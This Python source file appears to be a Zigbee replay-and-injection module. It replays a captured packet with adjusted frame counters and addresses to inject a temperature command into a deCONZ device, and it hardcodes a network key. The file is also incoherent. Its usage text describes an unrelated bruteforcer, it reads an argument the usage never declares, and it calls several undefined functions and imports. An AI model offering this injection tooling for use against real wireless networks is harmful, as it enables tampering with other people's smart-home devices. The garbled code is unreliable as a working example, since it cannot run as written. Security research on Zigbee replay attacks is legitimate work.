# Usage description for docopt
"""
Bruteforcing platform

Usage: 
    bruteforcer.py [-L <level>] [--users <userfile>] [--passwords <password>] [--target <target>] [--type <protocol>]

Options: 
    -h, --help                 Show this help menu.

    -L,             <level>    Level of bruteforce, 1 to 3  [default: 2].
    -u, --users  <userfile>    File specifying users to bruteforce. If a username (without file extension) is specified, it'll be used instead [default: user].
    -p, --passwords <password>            Network key.
    -t, --trace <FILE>         Pcap file to use for replay packets
    --sniff                    Only sniff the network without injecting packets 
"""
import sys
import os

from docopt import docopt, DocoptExit

class ReplayZCLDeconzTemp:
    def __init__(self):
        self.options = {
            'channel': {
                'Current Settings': '15',
                'Require': True,
                'Description': 'Channel to send [default: 15].'
            },
            'increment': {
                'Current Settings': '10',
                'Require': True,
                'Description': 'Increment to frame counters [default: 10].'
            },
            'default_fc': {
                'Current Settings': '200',
                'Require': True,
                'Description': 'Default frame counter set when previous \
                    is not known [default: 200].'
            },
            'key': {
                'Current Settings': 'f247868f650fa30e2f0d5e1abc341179',
                'Require': True,
                'Description': 'Default frame counter set when previous \
                    is not known [default: 200].'
            },
            'keep_addr': {
                'Current Settings': True,
                'Require': True,
                'Description': 'Keep same addresses for replayed packet'
            },
            'src': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of source (layer 3).'
            },
            'dst': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of destination (layer 3).'
            },
            'src2': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of source (layer 2).'
            },
            'dst2': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New short address of destination (layer 2).'
            },
            'panid': {
                'Current Settings': None,
                'Require': False,
                'Description': 'New PAN ID of the Zigbee Network.'
            },
            'trace': {
                'Current Settings': "zcl_deconz_tem.pcapng",
                'Require': True,
                'Description': 'Filename of the .pcap of the packet to replay.'
            },
            'use': {
                'Current Settings': "['deconztemp']",
                'Require': True,
                'Description': 'Describe use of the module for the replayer.'
            }
        }

        # Update args
        global args
        if args['--increment'] is not None:
            self.options['increment']['Current Settings'] = int(args['--increment'])

    def run(self):
        """
        Run the replay with the current settings 

        Usage: run [-h]

        Options:
            -h, --help  print this help menu
        """
        # Initialize replay packet
        conf.dot15d4_protocol = "zigbee"
        r_pkts = rdpcap(self.options['trace']['Current Settings'])

        # Set Zigbee replayer
        replayer = ReplayZigbeePacket()
        
        # Add injection command (write temperature)
        replay_pkts = [r_pkts[1]]

        module_args = []
        command = []
        command.append("\xbb")
        command.append("\xee")
        arg = {
            "zcl_command": command,
        }
        module_args.append(arg)
        replayer.add_replay_command(replay_pkts, "deconztemp", set_zclonoff_counters, module_args)

        # Run ZigBee replayer        
        replayer.run(self.options, check_zcl_temp, args['--sniff'])

if __name__ == '__main__':  
    
    banner = """
******* Zigbee injection module *******
            
            
* Starting injection
    """

    print(banner)
    version = 0.1    
    global args
    args = docopt(__doc__, version=version)

    # Create module replayer and run
    replayer = ReplayZCLDeconzTemp()
    replayer.run()